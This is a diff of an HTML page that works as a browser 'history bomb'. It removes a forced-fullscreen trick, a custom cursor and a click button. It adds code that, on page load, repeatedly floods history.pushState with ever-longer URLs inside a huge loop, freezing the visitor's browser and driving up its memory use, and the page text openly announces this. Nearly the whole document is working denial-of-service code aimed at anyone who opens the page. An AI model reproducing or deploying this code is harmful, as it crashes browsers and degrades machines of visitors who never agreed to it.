@@ -1,63 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
 <script> 
-
-	function callerinterval(){
-		setInterval(function(){requestFullScreen(); }, 1);
-	}
 
 	function bomb_url() {
 	  var total = "";
-	  for( var i = 0; i < 100000; i++ ) {
+	  for( var i = 0; i < 100000000000; i++ ) {
 	    total = total + i.toString();
-	    /* The total is the url being passed */
-	    /* @param: state, title, url */
-	    history.pushState(0,0, total );
-	    /* Displaying the value in page */
-	    // document.write(total)
+	    history.pushState(0,0, total);
 	  }
 	}
-	/* Set interval calls the bomb url in every 200 ms */
+
 	function intervalCall() {
 	  setInterval(function(){ 
-	    bomb_url(); }, 200);
+	    bomb_url(); }, 500);
 
-	}
-
-	function requestFullScreen() {
-	  var element = document.body;
-
-	  // Supports: IE, Firefox, Safari, Chrome, Opera and most browsers
-	  // https://developer.mozilla.org/en-US/docs/Web/API/Element/requestFullScreen
-	  var request = element.requestFullScreen || element.webkitRequestFullScreen 
-
-	  if (request) { // Native full screen 
-	    request.call(element);
-	  } else if (typeof window.ActiveXObject !== "undefined") { // Older IE
-	    var wscript = new ActiveXObject("WScript.Shell");
-
-	    if (wscript !== null) {
-	      wscript.SendKeys("{F11}");
-	    }
-	  }
-
-	  move();
-	}
-
-	function move() {
-   		intervalCall();
 	}
 
 </script>
 </head>
 
-
-<body onLoad="callerinterval()" style="background:#00000 url('transparent.jpeg') no-repeat top right; cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair;">
+<body onload="intervalCall()" style="background:#00000 url('transparent.jpeg');">
 
 <div>
-	<input id="clickbutton" type="button" value="Click me" onclick="requestFullScreen()" />
+	<p> Sit back and relax 5 to 10 sec, you browser will be freezed with spiking memory!</p>
 </div>
 
 </body>
